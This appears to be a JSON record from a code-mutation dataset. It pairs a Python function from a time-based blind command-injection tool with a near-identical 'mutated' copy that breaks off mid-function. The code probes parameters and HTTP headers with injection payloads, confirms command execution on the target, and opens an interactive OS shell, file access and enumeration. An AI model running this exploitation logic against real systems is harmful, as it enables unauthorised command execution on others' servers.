[
    {
        "func_name": "tb_injection_handler",
        "original": "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
        "mutated": [
            "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, 